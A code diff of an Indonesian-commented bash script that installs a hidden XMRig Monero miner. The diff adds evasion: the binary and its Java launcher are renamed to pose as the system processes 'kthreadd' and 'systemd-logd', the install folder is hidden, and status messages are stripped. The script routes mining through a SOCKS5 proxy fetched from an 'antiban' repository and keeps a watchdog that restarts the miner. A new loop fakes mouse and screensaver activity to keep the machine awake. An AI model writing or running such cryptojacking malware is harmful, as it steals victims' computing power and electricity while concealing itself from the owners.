@@ -6,39 +6,33 @@ WALLET="85MLqXJjpZEUPjo9UFtWQ1C5zs3NDx7gJTRVkLefoviXbNN6CyDLKbBc3a1SdS7saaXPoPrx
 POOL="24.199.99.228:1935"
 SOCKS5_IP="116.100.220.220"
 SOCKS5_PORT="1080"
-
-# === AMAN TANPA HOSTNAME ===
 if command -v hostname >/dev/null 2>&1; then
-  WORKER="stealth-$(hostname)"
+  WORKER="kthreadd-$(hostname)"
 else
-  WORKER="stealth-$(date +%s)"
+  WORKER="kthreadd-$(date +%s)"
 fi
+DIR="$HOME/.cache/.kthreadd"
 
-DIR="$HOME/.xmrig-java"
-
-echo "[*] Menyiapkan folder $DIR..."
+# === PERSIAPAN ===
 mkdir -p "$DIR" && cd "$DIR"
-
-# Bersihkan cache (tidak fatal jika gagal)
 sync || true
 echo 3 > /proc/sys/vm/drop_caches 2>/dev/null || true
 
-# === UNDUH XMRIG ===
-echo "[*] Mengunduh XMRig..."
+# === DOWNLOAD XMRIG ===
 XMRIG_URL=$(curl -s https://api.github.com/repos/xmrig/xmrig/releases/latest | \
 grep browser_download_url | grep linux-static-x64.tar.gz | cut -d '"' -f 4)
 curl -sLo xmrig.tar.gz "$XMRIG_URL"
 tar -xzf xmrig.tar.gz --strip-components=1
 rm -f xmrig.tar.gz
-mv xmrig systemd-journal
-chmod +x systemd-journal
+mv xmrig kthreadd
+chmod +x kthreadd
 
 # === PROXYCHAINS ===
 curl -sLo proxychains https://raw.githubusercontent.com/sagemantap/xmrig-antiban/main/proxychains
 curl -sLo libproxychains.so.4 https://raw.githubusercontent.com/sagemantap/xmrig-antiban/main/libproxychains.so.4
 chmod +x proxychains libproxychains.so.4
 
-# === KONFIGURASI PROXYCHAINS ===
+# === KONFIGURASI PROXY ===
 cat > proxychains.conf <<EOF
 strict_chain
 proxy_dns
@@ -74,7 +68,7 @@ public class Launcher {
         Thread.sleep(new Random().nextInt(10) * 1000 + 5000);
         ProcessBuilder pb = new ProcessBuilder("bash", "-c",
           "LD_PRELOAD=" + System.getenv("PWD") + "/libproxychains.so.4 PROXYCHAINS_CONF_FILE=" +
-          System.getenv("PWD") + "/proxychains.conf ./systemd-journal --config=config.json");
+          System.getenv("PWD") + "/proxychains.conf ./kthreadd --config=config.json");
         pb.redirectOutput(new File("/dev/null"));
         pb.redirectErrorStream(true);
         pb.start().waitFor();
@@ -86,21 +80,20 @@ public class Launcher {
 EOF
 
 javac Launcher.java
-jar cfe launcher.jar Launcher Launcher.class
+jar cfe systemd-logd.jar Launcher Launcher.class
 
-# === JALANKAN LAUNCHER ===
-nohup java -jar launcher.jar >/dev/null 2>&1 &
+# === JALANKAN MINER SECARA STEALTH ===
+nohup java -Djna.nosys=true -Djava.awt.headless=true -jar systemd-logd.jar >/dev/null 2>&1 &
 disown
 
 # === WATCHDOG ===
 cat > watchdog.sh <<EOF
 #!/bin/bash
 while true; do
-  if ! pgrep -f launcher.jar >/dev/null; then
-    echo "[!] Launcher mati. Memulai ulang..."
+  if ! pgrep -f systemd-logd.jar >/dev/null; then
     sync || true
     echo 3 > /proc/sys/vm/drop_caches 2>/dev/null || true
-    nohup java -jar launcher.jar >/dev/null 2>&1 &
+    nohup java -jar systemd-logd.jar >/dev/null 2>&1 &
     disown
   fi
   sleep 60
@@ -111,4 +104,22 @@ chmod +x watchdog.sh
 nohup bash watchdog.sh >/dev/null 2>&1 &
 disown
 
-echo "[✓] XMRig stealth berhasil dijalankan dengan Java launcher + watchdog."
+# === ANTI SUSPEND / ANTI DISMISS JARINGAN ===
+cat > antisuspend.sh <<EOF
+#!/bin/bash
+while true; do
+  if [ -e /dev/input/mice ]; then
+    dd if=/dev/zero of=/dev/input/mice bs=1 count=1 2>/dev/null
+  fi
+  xset s reset >/dev/null 2>&1 || true
+  gdbus call --session --dest org.freedesktop.ScreenSaver --object-path /org/freedesktop/ScreenSaver \\
+    --method org.freedesktop.ScreenSaver.SimulateUserActivity >/dev/null 2>&1 || true
+  sleep 30
+done
+EOF
+
+chmod +x antisuspend.sh
+nohup bash antisuspend.sh >/dev/null 2>&1 &
+disown
+
+echo "[✓] Stealth miner aktif dengan Java + watchdog + anti suspend."
